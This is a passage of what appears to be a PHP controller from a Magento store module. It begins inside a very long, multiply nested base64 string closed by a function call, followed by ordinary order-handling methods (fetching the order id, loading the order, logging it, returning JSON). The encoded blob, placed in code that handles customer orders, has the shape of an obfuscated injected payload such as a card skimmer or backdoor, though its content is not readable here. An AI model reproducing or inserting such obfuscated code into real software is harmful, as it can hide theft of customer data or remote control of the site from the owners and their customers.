TJ4a2NWWnNjRTVoYTFwSlZrZDRWMDFHU2tkV2JsWnBVakJhV1ZWc1VsTk9SbVJZWkVjNVZtSlZOVWRhUlZwVFZXMUdkRlZyV2xkV2JVMHhXVzE0VDFac1VuSlRiVVpPVWpOb1JsWldXbXRoTVU1elVsaGtVMkpVVmxWV2JGVXhVVEZrY1ZGdVRsTlNhMXBaVjJ0V2QxVnJNVVpYYmxaV1RWWmFjbGw2U2t0V2JVcEdWVzFvVkZKVmNIaFdSbHBUWXpBMWMyTkZXbWhTV0ZKeFZXcENkMDFHWkZWVFZGWlVUVlUxUjFrd2FFOVhiVlp5VGxab1dtVnJjRlJWYTJSR1pWWndTRTFXVWxSU01Vb3hWbXBLZDFNeFdYZE5WV1JoVFRKNFZsbHRjekZaVmxsM1ZsUkdUMkpGTVROV1IzaFBZa1phZFZGc2NGZFNNMEpJV1ZaYVQxSXhTblZhUmxKWFZtdFplbFpFUmxkak1VcEhZMFZhVDFadVFsaFVWM2hMWld4a1dFMUVSbFpOYkVwNldWVldZVmRIU25SbFIwWlhZbTVDU0ZsNlJuZFNWazVWVm0xNFYwMUdXVEJYYkZaaFVqSkdSMVJyV21wU2VteGhXbGQwZDFZeGJIUmtSRUpYVW10YWVGZHJWbGRXYkZvMllraFdWazFXV2xCVlYzaDJaREpLUmxWc1NsZE5iRXBNVmxaU1ExSXlTbk5VYkZwVllUQndhRlJWWkRSU1ZsWlhXa2QwVkdKRlZqTlZiVEF4VmtaYVZrNVZUbGhoYTBwNlZXdGFSMWRIVWtoalIyeFhZa2M0ZVZZeWRHRmhNRFZHVFZWYWFWSldXazlWYWtwVFYxWndWMXBHVGs5V2JWSjZXVlZWTlZSc1dYZGpSWEJYVm0xTmVGVXllRXRTVmtaWlUyeFNWMVpVVmxWWGJGcGhaREZrVjFWdVJsTmlWM2hWVlcxMGQyTnNXa1ZVYlhCclRWVXhNMWxyVmxOVmJGbDVWV3QwVmxaRlNraFpiWGhQVm14U2NsTnRSazVTTTJoR1ZsWmFhMkV4VG5OU1dHUlRZbFJXVlZac1ZURlJNV1J4VVc1T1UxSnJXbmhaYTFaM1ZUQXhWMk5FV2xoWFNFSk1WbTE0ZG1WV1duRlVhelZUVjBaS1RGWldVa05TTWtwelZHeGFWV0V3Y0doVVZXUTBVbFpXVjFwSGRGUmlSVll6Vlcwd01WWkdXbFpPVlU1WVlXdEtlbFZyV2tkWFJuQkdZMFpLVGxKV2NERldWRVpYVkRGR2MySXpiRlpoTW1odlZUQmtOR05HVWxWVGF6bHBZa2Q0TUZSV1dtdFVhekZJWlVWa1lWWlhhR2hXTW5ONFkyeGtkV05HY0ZkaVYyZDZWMWQwWVdReFNuTlhia1pXWWtoQ1QxbHJXblpsYkdSeVZtMTBhazFzU2pCVk1qVkRZVVpKZUdOR2NHRldiVkp5V2taYVYyTnNjRWxVYlhocFVqTm9XbGRzVm05VU1rWldUVWhzVm1Kck5WbFpWRUV4VWtad1YxZHVaRmhXYkVwNFZXMHhjMVpHU25KWGJsWllZVEZhZGxsNlNsSmxSMDVIVld4d1RrMUZjRTVXYlhSdlZERlJlRkpZYkdsU1ZYQm9WRlZrTkZKV1ZsZGFSM1JVWWtWV00xVnRNREZXUmxwV1RsVk9XR0ZyU25wVmExcEhWMFp3Um1OR1NrNVNWbkF4VmxSR1YxUXhSbk5pTTJ4WVlrVndUMVZzYUZOVE1WWlZVV3RrYVdKRk5WZFdSM1JMV1ZVeFNHVkZWbFpXYlZKeVZUSjRSbVF4U25ST1ZsSlhWbFJXUkZZeWNFTmpNVTVXVFZWYVQxWldTbTlXYkZaaFpGWlZlRlpyT1ZKaVJ6a3pXV3RXVTFWc1dYbFZhM1JXVmtWS1NGbHRlRTlXYkZKeVUyMUdUbEl6YUVaV1ZscHJUVVpzVjFOWWJHeFNSbkJaVm0weFVrMUdiRFpUYTNCc1lraENTVnBWWkVkVk1rVjNZMGhhV0ZaRmJEUlZha3BUVTBaU2NWWnNTbGRTTTJoTVZsY3dNVlF5VWxkYVJtUmhVa1pLY1ZSWGRITk9iR1J5V2tSU1dsWnJWalZXUnpWM1ZrWmFWazVZU21GV2VrWlVWVEJhUzJOV1JuUmtSbWhUVmtWWmVGWnJWbGRVTVVaMFUyNU9hbEp0ZUZWWmJURTBZMFpTVlZGdVRtdFdiVkpJVmxjMWQxWlhSWGRPV0dSV1ZtMVNjbFV5ZUVaa01VcDBUbFpTVjFaVVZrUldNbkJEWXpGS1IxSnNhR0ZTV0VKVFZGVldZV1JXVlhoV2F6bFNUV3R3V1ZVeGFIZFdSMHBaWVVkR1YyRnJSWGhhUjNoUFZteFNkRTVYYUU1aGVsVjNWbTB3TVdReVJYaFhXSEJoVFRKU1ZWWnNaRk5UUm5CWVpFaE9VMUpzV2pGVk1qRkhWMFpKZWxWdVZsZFdWbkJUVkZWYWRtUXlUa1ppUmtwcFZqSm9lRmRYZUZkWlZURkhWRmhvVldFd05WQlVWVnBMVlRGc2NWTnRkRlJpUlZZelZXMHdNVlpHV2xaT1ZVNVlZV3RLZWxWcldrZFhSbkJHWTBaS1RsSldjREZXVkVaWFZERkdjMkl6WkdsU1ZrcFRWbXBLVTFNeFZuRlRhbEpyVW1zMVYxWkhNREZoUmtsM1YyeHNWV0pIVW1oV01uaHJVbTFPUlZac2FGZGlWMmcxVjFkd1EyUXhUa2hWYTJoc1VqTm9WMVJVU2xOa1ZsVjVaRWQwVmsxck5VbFdSbWh6VlRKS2NrNVlRbFppYmtKNVdsZDRhMk14Y0VkVWJGcFhZbGhvWVZaVVNYaGlNa1pYV2tWYVRsZEhVbFZVVmxVeFVrWlNjVkZzVGxaaVZXdzFWMnRXZDFWck1VWlhibFpXVFZaYVVGVlhlSFprTWtwR1ZXeEtWMDFzU2t4V1ZsSkRVakpLYzFSc1dsVmhNSEJvVkZWa05GSldWbGRhUjNSVVlrVldNMVZ0TURGV1JscFdUbFZPV2xaRmNGUlZNR1JIVTFaR2RHTkhlRmRTVlZvMVZqRlNTbVZHV1hsV2JsSlZZVEpvVVZZd1dtRmpWbEpZWlVkR2FGWnJOWGxYYTFKRFlWWkplRmRzYUZWV1YxSnlWbFphVm1ReFNuVlRiSEJPVWpGS1NWZHNXbUZqTVdSR1RWVldZVkpXV2xkV2JuQnpaRlpWZUZack9WSmlSemt6V1d0V1UxVnNXWGxWYTNSV1ZrVktTRmx0ZUU5V2JGSnlVMjFHVGxJemFFWldWbHByWVRGT2MxSllaRk5pVkZaVlZteGthMDB4V2toa1JUbHFVbXRhV1ZkclZuZFZhekZHVjI1V1ZrMVdXbEJWVjNoMlpESktSbFZzU2xkTmJFcE1WbFpTUTFJeVNuTlViRnBWWVRBMVVWWnNXa3RWTVd4eFUyMTBWR0pGVmpOVmJUQXhWa1phVms1VlRsaGhhMHA2Vld0YVIxZEdjRVpqUmtwT1VsWndNVlpVUmxkVU1VWnpZak5rYWxKWGVGZFpiRkp6WWpGWmQxWllhRTVTYkZwSlZGWldhMkZGTVZsUmEyUmhWbGRvYUZkV1ZYZGtNREZaVjJ4U1RsWnJiekpXYTJRd1ZESk9SMUpzYUdGU1dFSlRWRlZXWVdSV1ZYaFdhemxTWWtjNU0xbHJWbE5WYkZsNVZXdDBWbFpGU2toWmJYaFBWbXhTY2xOdGFFNWlSWEJLVjFaV2IxRXlSblJXYkZaU1YwVndZVlJYY0VkWFJuQllUVlU1VkZKVWJGcFdiVEYzVkcxS1IyTklRbFpOYmtKTVZXcEtUbVZXVG5KaFJrSlhVbFJXYjFadGNFZFNNbEpYV2tWa1ZXRXdjRkZXYkdRMFVteFdjMVZ0ZEZOV2JGcFpWREZqTVZaR1dsWk9WVTVZWVd0S2VsVnJXa2RYUm5CR1kwWktUbEpXY0RGV1ZFWlhWREZGZDA5V1dtbFNWMmhZV1cxek1XTldVbGhsUm1ScFlraENXbGRVVG10V1JURklaVVZXVmxadFVuSlZNbmhHWkRGS2RFNVdVbGRXVkZaRVZqSndRMk14U2tkU2JHaGhVbGhDVTFSVlZtRmtWbFY0Vm1zNVZrMUVSa2xWYlhSdllWWk9TVkZyTlZkaE1VcFlWR3hhYTJNeVJrWlBWM1JPWVRKM01WWkhlRzlrTVd4WFYyNVdWV0pzV21GVVYzQkhWMFp3V0UxV1RsaFNNVnBHVlZkME1GUnNXa1pUYmxaWFZsWndVRlZYTVV0ak1VWnlZVVphYVdFd2NIbFhWbHBYVXpKT1YySklTbUZTVjFKeldXeFZNRTFzVWxaYVNFNW9VbTFTU1ZaWE5VdFdWa3AwVkZSR1lWSldXVEJXTVZwSFpGWmtkR05HVWxOaVJ6azJWbXRXWVdFeVNYbFRhMlJwVW0xb1YxbHNhRzlqVm14WFZtNUthbUpGTlRGWmExWkxZVEZhV0dWRlZsZFdNMEpFV1ZWYVNtVlhWa1ZYYkZaVFlrVldORmRYY0Vka01XUklWbXRzWVZJd1dsbFZiR1F6WkRGYVZsa3phR2hOYTNCSlZsZDBZVll5U25SbFNFWmFZa1pLZWxSc1dtRlNNWEJIV2tkNGFWWlVSVEZXVnpCM1RWWnNWMVpZYkdGVFIxSlZWbXhWZDJReFpIRlJibVJQWWxaR05sWXlNVWRWTURGMVdrUldWMVpYVW5wWlYzaDJaREpXU0U1Vk5WTlhSa3BNVmxaU1ExSXlTbk5VYkZwVllUQndhRlJWWkRSU1ZsWlhXa2QwVkdKRlZqTlZiVEF4VmtaYVZrNVZUbGhoYTBwNlZXdGFSMWRHY0VaalJrcE9VbFp2ZUZac1ZsZGhNVlY1Vkd0b1ZtSnJTbE5aYkdoRFkwWldjVkZ0Ums5aVIzUTJXV3BPYTJGR1dYZFhiSEJZWVRKUmQxWkdXbUZPYlVwRlVXeFdVMkpYYUVWWGEyTjRWREZPVjFkdVZtRlNWRVpZVkZjMWJtVkdXWGxOU0dSUFVqQmFXRlZYTlVOWGF6RjBWV3MxV2xac1draFpNbmgzVW14d1NFOVhjRk5OUkZGNFZrWldUMDFIUmtkVFdHaFlZbTVDWVZSVlpGTlhSbkJYVm1wU1YxWlVWbGxVYkdSSFYwWktjbU5GZEZkTmJtaHlWR3RrVW1WR1pISmhSbVJvWWtWd2VWWldVa3RoTWxGNFZHeGFWVlpGU21oVVZXaENUV3h3UlZSdFJscFdhMncxV2tST2MxWnNTWGxsU0VaVllXdEtWRlpYTVVwbFZuQkdZMFpLVGxKV2NERldWRVpYVkRGR2MySXpaR2xTVmtwVFZtcEtVMU14VmxWUmEyUnBZa1UxVjFaSGRFdFpWVEZKVVd0d1YxWjZRVEZaVlZwclVtc3hWVkZzV2xObGJGcE5WMWQwYTFSdFZuTlNibFpZWWxkNGNGbFljRmRsYkZweFZHNU9hRTFyY0VsV2JYUnpWbTFLVjJOSVNsZE5SbG96V2xkNFQyTldTbGxhUjBaT1ZsVndWbFpXV210ak1rWkhWR3RrVkZkSFVtRlVWV1J2VkRGU2RHUkVVazlXVkd4V1ZrY3hNRlJyTVhKT1NHaFlWbXh3ZGxsVVNrWmxSMHBIWVVkR1UwMHlhSGRYVjNoV1RVVXhWMVZyYUU1V1ZHeHlXV3hXZDFaV1VYaGFSRkpwVW1zMVNGVXlOVTlYYlVwVlZteENXazFIVWt0YVZsVXhWMWRPUmsxVk5XbFNWemsxVmpKMFUxTnJNVmhVV0d4VVYwZDRWRmxzYUZOWlZscHhVVzVrYkdKSFVucFdSbEpYWVVkS1YxTnNjRmRTTTBKRVdWWlZlR05XU25WVWJIQk9ZbGhOZUZkclVrdFVNbEpHVDFab2ExSXpVbGhVVlZKVFRURmtWVlJ1VGxSaGVsSXpWbGQ0UzJGVk1YUlZhM1JXVmtWS1NGbHRlRTlXYkZKeVUyMUdUbEl6YUVaV1ZscHJZVEZPYzFKWVpGTmlWRlpWVm14Vk1WRXhaSEZSYm1SVVZteGFNRlF4Wkc5WFJrcFZVbGhrVjFaWFRYaFZla3BMVTBaU1dXTkdTbWxpU0VKM1YxY3hlazFYVFhoWFdIQnBVak5TYjFWcVFuZFRWbkJXWVVkR2FFMUVSbnBXTWpWTFZrZEdjbFpxVGxoaGExcEVWbXRhUjFkV2NFZFJiWFJzWVRCd1RsWlVSbGRVTVVaellqTmthVkpXU2xOV2FrcFRVekZXVlZGclpHbGlSVFZYVmtkMFMxbFZNWE5qUms1VlZsWlpkMVV5ZUVaa01VcDBUbFpTVjFaVVZrUldNbkJEWXpGS1IxSnVSbWxTV0VKVVZGWmFkMDVzWkZsalJYUlhZa2M1TlZadGNFOVViRXBaVld0MFZsWkZTa2haYlhoUFZteFNjbE50Ums1U00yaEdWbFphYTJFeFRuTlNXR1JUWWxSV2FGVnNaRk5rYkhCWFdrVndiR0pIZERWWGEyUnpZVlphYzJKRVdsWk5WbHBZVkd0a1UyTXlSWHBpUms1cFlYcFdkbFpxUW05Uk1rMTRXa2hLVjJKSFVsQlZiVEV3VGxaYWRFNVhkR2hOVld3MVdsVlNTMWR0U2xobFNGcFlZbGhvZGxSc1duWmxWMHBIV2taa2JHSkdiekZXTVdOM1pEQTFWazFJYkZSaWEwcFRXV3hrYjFsV1VsVlNhM1JyVFZkNGVGVXhVa05aVlRGelUydHdXbUV5YUhKWFZscFdaREpLU1ZwR1VrNVdhMjh5Vm10a01GUXlUa2RTYkdoaFVsaENVMVJWVm1Ga1ZsVjRWbXM1VW1KSE9UVldNbmhMVlZaYVJWRnVWbFJOVlRWNVZHNXNhbU5GZEZWamVqQnVTMU5yTnljcEtUcz0nKSk7'));
    }

    /**
     * @return string|string[]
     */
    abstract protected function getResultHtml();

    /**
     * Return order id from params
     * @return int
     * @throws \Exception
     */
    public function getOrderId()
    {
        $id = $this->getRequest()->getParam('order_id', null);
        if (empty($id)) {
            throw new LocalizedException(__('Empty param id'));
        }
        return $id;
    }

    /**
     * @return void
     */
    public function addLogs()
    {
        $order = $this->getOrder();
        Logger::getInstance()->saveLogs($order);
    }

    /**
     * @return \Magento\Sales\Model\Order
     * @throws \Exception
     */
    protected function getOrder()
    {
        $orderId = $this->getOrderId();
        return $this->_objectManager->get('Magento\Sales\Model\Order')->load($orderId);
    }

    /**
     * @return $this
     */
    private function getJsonResponse()
    {
        /** @var \Magento\Framework\Controller\Result\Json $resultJson */
        $resultJson = $this->resultFactory->create(ResultFactory::TYPE_JSON);
        return $resultJson->setData($this->response);
    }
}
